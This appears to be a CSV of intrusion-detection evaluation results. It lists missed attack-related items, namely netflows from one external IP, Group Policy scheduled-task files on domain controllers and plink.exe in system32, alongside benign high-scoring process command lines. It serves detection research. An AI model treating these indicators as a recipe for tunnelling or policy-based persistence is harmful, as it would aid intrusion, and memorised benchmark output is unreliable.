+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50136,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49970,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49938,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50074,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49987,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50072,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50130,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53323,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49951,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50003,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53345,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:52442,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53317,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50071,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49982,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50119,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49978,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53304,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53355,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53352,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53313,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49928,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50056,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53299,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53314,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49958,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49976,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53266,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53289,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49973,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53125,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49964,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53274,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53312,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53358,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53325,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49930,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53255,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53333,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53311,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53277,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53327,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53300,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:22->142.20.57.246:54065,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53316,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50054,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
+FN_below_threshold,file: /Device/HarddiskVolume1/windows/system32/plink.exe,1,0.001336898
+FN_below_threshold,file: /Device/HarddiskVolume1/Windows/system32/plink.exe,1,0.001336898
+TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE",114,0.228000000
+TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn",101,0.202000000
+TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs",79,0.158000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/SysWOW64/OneDriveSetup.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",26,0.052000000
+TN_high_below_threshold,subject: %SystemRoot%/system32/csrss.exe | C:/Windows/System32/svchost.exe -k wsappx,22,0.044000000
+TN_high_below_threshold,subject: System,21,0.042000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",13,0.026000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",11,0.022000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/backgroundTaskHost.exe | ""C:/Windows/system32/backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",10,0.020000000
+TN_high_below_threshold,"subject: schtasks.exe | schtasks  /create /tn KickoffAutoLoginRandom /tr ""python C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN"" /sc MINUTE /mo 30 /ru ""SYSTEM""",9,0.018000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Windows/system32/svchost.exe -k UnistackSvcGroup,9,0.018000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Windows/System32/RuntimeBroker.exe -Embedding,9,0.018000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | C:/Python27/python.exe ""c:/ncr/mantra/runtime/Scripts/mantra-script.py"" ""-d"" ""c:/ncr/mantra"" ""--random_startup"" ""17""",8,0.016000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Windows/SystemApps/Microsoft.Windows.Cortana_cw5n1h2txyewy/SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",7,0.014000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe"" ",7,0.014000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Python27/python.EXE | C:/Python27/python.EXE C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN,7,0.014000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe,6,0.012000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /Automation -Embedding",5,0.010000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /Automation -Embedding",5,0.010000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",4,0.008000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | C:/Python27/python.exe ""c:/ncr/mantra/runtime/Scripts/mantra-script.py"" ""-d"" ""c:/ncr/mantra"" ""--random_startup"" ""17""",4,0.008000000
+TN_high_below_threshold,"subject: %SystemRoot%/system32/csrss.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",4,0.008000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe | ""C:/Windows/system32/SearchProtocolHost.exe"" Global/UsGthrFltPipeMssGthrPipe189_ Global/UsGthrCtrlFltPipeMssGthrPipe189 1 -2147483646 ""Software/Microsoft/Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc"" ""DownLevelDaemon"" ",3,0.006000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Python27/python.EXE C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN,2,0.004000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/wbem/wmiprvse.exe | ""C:/Program Files/VMware/VMware Tools/vmtoolsd.exe""",2,0.004000000
+TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",2,0.004000000
+TN_high_below_threshold,subject: PING.EXE | ping -w 2000 -n 2 127.0.0.1,2,0.004000000
+TN_high_below_threshold,subject: %SystemRoot%/system32/csrss.exe | C:/Windows/system32/compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV 9AWMJ9YGnkCn8TO9.1.1 -SendFullTelemetry -ThrottleUtc,2,0.004000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/compattelrunner.exe | C:/Windows/system32/compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV tamiCH8Zw0G1eMis.1.1 -SendFullTelemetry -ThrottleUtc,2,0.004000000
+TN_high_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/wbem/wmiprvse.exe | C:/Windows/System32/RuntimeBroker.exe -Embedding,2,0.004000000
+TN_high_below_threshold,"subject: %SystemRoot%/system32/csrss.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",2,0.004000000
